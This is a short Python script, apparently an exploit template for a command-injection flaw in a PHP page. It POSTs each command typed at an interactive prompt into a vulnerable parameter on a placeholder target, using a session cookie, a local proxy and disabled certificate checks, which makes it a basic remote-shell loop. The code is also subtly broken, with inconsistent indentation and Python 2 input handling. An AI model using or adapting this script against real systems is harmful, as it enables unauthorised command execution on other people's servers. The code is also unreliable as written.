import requests
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

http_proxy  = "http://127.0.0.1:8080"
proxy = { 
              "http"  : http_proxy, 
            }
cookies = {
        'PHPSESSID':'dnjcndc...'
        }

class Exploit(object):
    def __init__(self):
        self.url = "http(s)://target.com/vuln.php"
    
   def makeRequest(self, cmd):
       requests.post(self.url, cookies=cookies, verify=False, data={'hidden_vulnparam': cmd}, proxies=proxy)
       
   def runCmd(self, cmd):
       self.makeRequest(cmd)
    
out = Exploit()
while True:
    cmd = raw_input("> ")
    out.runCmd(cmd)  
